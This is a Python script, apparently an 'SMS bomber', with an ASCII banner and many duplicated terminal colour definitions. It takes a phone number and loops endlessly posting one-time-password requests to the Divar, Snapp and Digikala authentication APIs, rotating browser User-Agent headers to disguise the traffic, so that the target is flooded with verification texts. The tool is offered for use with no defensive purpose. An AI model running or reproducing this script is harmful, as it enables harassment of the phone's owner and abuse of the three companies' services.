import requests 
from colorama import Fore as f
import random
from os import system


red = '\033[91m'
green = '\033[92m'
blue = '\033[94m'
yellow = '\033[93m'
magenta = '\033[95m'
cyan = '\033[96m'
white = '\033[97m'
bold = '\033[1m'
underline = '\033[4m'
black='\033[30m'
Backsilver='\033[100m'
silver='\033[90m'
Backwhite='\033[3m'
Backgreen='\033[42m'
Backyellow='\033[43m'
BackBlue='\033[44m'
Backpink='\033[45m'
Backcyan='\033[46m'
BackRed='\033[41m'
red = '\033[91m'
green = '\033[92m'
blue = '\033[94m'
yellow = '\033[93m'
magenta = '\033[95m'
cyan = '\033[96m'
white = '\033[97m'
bold = '\033[1m'
underline = '\033[4m'
black='\033[30m'
Backsilver='\033[100m'
silver='\033[90m'
Backwhite='\033[3m'
Backgreen='\033[42m'
Backyellow='\033[43m'
BackBlue='\033[44m'
Backpink='\033[45m'
Backcyan='\033[46m'
BackRed='\033[41m'
green = '\033[32m' 
red = '\033[31m' 
blue = '\033[36m' 
pink = '\033[35m' 
yellow = '\033[93m' 
darkblue = '\033[34m' 
white = '\033[00m'
bluo = '\033[34m'
red_p = '\033[41m'
green_p = '\033[42m'
bluo_p = '\033[44m'
pink_p = '\033[45m'
blue_p = '\033[46m'
white_p = '\033[47m'
rd = '\033[91m'
black='\033[30m'
bold = '\033[1m'
underline = '\033[4m'
magenta = '\033[95m'

system("cls")


#Banner
print(f"""{silver}
██╗  ██╗ ██████╗ ███████╗████████╗ ██╗██╗     ███████╗████████╗     {cyan}Creator {rd}>{darkblue} host1let    {silver}           
██║  ██║██╔═══██╗██╔════╝╚══██╔══╝███║██║     ██╔════╝╚══██╔══╝
███████║██║   ██║███████╗   ██║   ╚██║██║     █████╗     ██║        {rd}version > {magenta}3.4.8{silver}
██╔══██║██║   ██║╚════██║   ██║    ██║██║     ██╔══╝     ██║   
██║  ██║╚██████╔╝███████║   ██║    ██║███████╗███████╗   ██║        {green}Git Hub{rd} > {f.YELLOW}https://github.com/Zrexer/SmS  {silver}
╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝    ╚═╝╚══════╝╚══════╝   ╚═╝   
{f.BLUE}--------------------------------------------------------------------------------------------------------
                                                                                                            """)


number = input(f"{f.RED}Enter Your Number {f.GREEN}(without 0){f.WHITE}> ")

api_divar = "https://api.divar.ir/v5/auth/authenticate"
json_divar = {"phone":number}
api_snapp = "https://app.snapp.taxi/api/api-passenger/v2/otp"
json_snapp = {"cellphone":"+98"+number}
api_dijikala = "https://api.digikala.com/v1/user/authenticate"
json_dijikala = {"phone":"0"+number}

heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
        'Accept' : '*/*'
    },

    {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux; x86_64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Accept' : '*/*'
    },

    {
        'User-Agent': 'Mozilla/5.0 (X11; Debian; Linux;  x86_64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Accept' : '*/*'
    }

]






while True:
    random_head = random.choice(heads)
    req1 = requests.post(url=api_divar, json=json_divar,headers=random_head)
    print(req1)
    req2 = requests.post(url=api_snapp, json=json_snapp,headers=random_head)
    print(req2)
    req3 = requests.post(url=api_dijikala, json=json_dijikala,headers=random_head)
    print(req3)
